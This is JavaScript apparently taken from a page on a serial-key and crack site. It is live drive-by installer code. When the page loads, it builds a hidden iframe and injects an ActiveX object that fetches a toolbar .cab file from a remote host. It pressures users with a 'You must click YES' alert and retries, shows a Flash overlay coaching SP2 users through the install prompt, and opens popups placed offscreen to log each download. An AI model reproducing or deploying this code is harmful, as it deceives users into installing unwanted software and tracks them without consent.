<!--
 var flag=0;
 var loadfirst=1;
 var track='normal';
 try{
   var referer=document.location;
   }
 catch( e ) {
   var referer='';
 }
 var sp2=false;
 var holder;
 if(window.navigator.userAgent.indexOf("SV1") != -1) sp2=true;
 if (sp2){
   track='flash';
   document.write('<div id="tutorial_popup" style="visibility:hidden;position:absolute;top:0px;left:0px;width:635px;height:308px;"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="635" height="308">');
   document.write('<param name="movie" value="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf">param name="quality" value="high"><param name="wmode" value="transparent">');
   document.write('<embed src="http://www.slotchbar.com/ist/flash/sp2tutorial_v1.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="700" height="500"></embed></object></div>');
   } 
 document.write('<iframe id="downloads_manager" style="position:absolute; visibility:hidden;"></iframe>');
 function retryit(){
        if(window.retry && retry>0 && !sp2) {
                alert("You must click YES to get access"); 
                loadfirst=0;
                start_download();
                retry--;
                }
        }
 function showActiveX() {
        holder.write('<OBJECT id="barobject" width=1 height=1 classid="CLSID:7C559105-9ECF-42b8-B3F7-832E75EDD959"');
        holder.write('codebase="http://www.xxxtoolbar.com/ist/softwares/v4.0/0006_regular.cab" onerror="parent.retryit();">');

        holder.write('<PARAM name="account_id" value="145201">');
        holder.write('<PARAM name="download_key" value="e803c0124aeb7d061baf2aa29771ac4b">');
        holder.write('<PARAM name="download_lock" value="1117671250">');
        holder.write('<PARAM name="cfg" value="mtb_c">');
        holder.write('<PARAM name="sub" value="">');
        holder.write('<PARAM name="referer" value="' + escape(referer) + '">');
        holder.write('<PARAM name="track" value="' + track + '">');
        holder.write('</OBJECT>');
}
 function start_download() {
        var bname=navigator.appName;
        var bver=parseInt(navigator.appVersion);
        if (bname == 'Microsoft Internet Explorer' && bver >= 2) {
                if(!loadfirst || sp2){
                        downloads_manager.document.close();
                        holder= downloads_manager.document;
                } else {
                        holder=document;
                        }
                showActiveX();
		if (sp2) document.all.tutorial_popup.style.visibility = "visible";
                                if(!flag && !sp2){
                        window.open("http://www.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=145201&auto_close=1&software_id=0006&referer=http%3A%2F%2Fwww.freeserials.ws%2F%3Fq%3Dnero%2B6.6%2Bcrack&type=normal","_blank","top=10000, left=100000");
                } if(!flag && sp2){
                        holder.write('<IMG SRC="http://www.xxxtoolbar.com/ist/scripts/log_downloads.php?account_id=145201&auto_close=1&software_id=0006&referer=http%3A%2F%2Fwww.freeserials.ws%2F%3Fq%3Dnero%2B6.6%2Bcrack&type=flash" width=1 height=1 border=0>');
                        }
                flag++;
        } 
}

 function start_download_loadfirst() { 
        start_download(); 
        }

 // -->


<!--
	var currentDate = new Date();
	var adRecurrence = "always";
	var adId = "a1114478426";
	var adExpiration = 0;
	var retry=2;
	var obj=null;	

    
	function SetCookie(sName, sValue, sExpire){
		var expireCode = "";
		if (sExpire) { expireCode =  "expires=" + sExpire + ";" }
		document.cookie = sName + "=" + escape(sValue) + ";" + expireCode
	}


	function GetCookie(sName) {
		var aCookie = document.cookie.split("; ");
		for (var i=0; i < aCookie.length; i++) {
			var aCrumb = aCookie[i].split("=");
			if (sName == aCrumb[0]) { return unescape(aCrumb[1]); }
		}
		return null;
	}
	
	function upop() {
				var url = "http://www.xxxtoolbar.com/ist/scripts/downloads_manager.php?pevent_type=onload&retry=2&ref=http://www.freeserials.ws/?q=nero+6.6+crack&retry=2&loadfirst=1&delayload=0&account_id=145201&recurrence=always&adid=a1114478426&event_type=onload";
		var win='toolbar=1,location=1,directories=0,menubar=0,scrollbars=1,resizable=1,top=110,left=2000,width=600,height=500'
		window.open(url,'pop',win);
		if(obj)
			obj();
	}


		SetCookie(adId,"1", adExpiration);
					start_download();
		//-->
